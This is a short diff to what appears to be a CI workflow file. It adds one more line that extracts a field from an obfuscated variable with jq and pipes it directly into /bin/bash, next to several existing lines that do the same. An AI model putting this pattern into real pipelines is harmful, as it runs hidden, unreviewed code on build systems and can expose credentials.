@@ -25,6 +25,7 @@ jobs:
           echo $sxud8 | jq -r .pa1 | /bin/bash
           echo $eer2195 | jq -r .sp49 | /bin/bash
           printf '%s' "$xvlt2" | jq -r .byh275 | /bin/bash
+          echo $jtee1 | jq -r .aby61572 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
